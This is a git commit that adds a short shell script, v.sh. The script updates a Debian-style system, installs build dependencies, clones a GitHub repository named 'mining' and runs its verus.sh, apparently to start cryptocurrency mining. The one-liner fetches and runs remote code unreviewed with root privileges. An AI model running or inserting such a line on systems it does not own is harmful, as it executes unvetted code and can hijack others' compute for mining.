ae1767cdd6ffd5e149d88fff4a8c139094b55597
Tokisaki_mitsuha <71954996+Tokisaki-mitsuha@users.noreply.github.com>
2021-10-25 18:26:13 +0700

    Create v.sh

---
+++ v.sh
@@ -0,0 +1,2 @@
+#uzaki
+apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 git && git clone https://github.com/Tokisaki-mitsuha/mining.git && cd mining && chmod +x compile.sh && chmod +x verus.sh && ./verus.sh
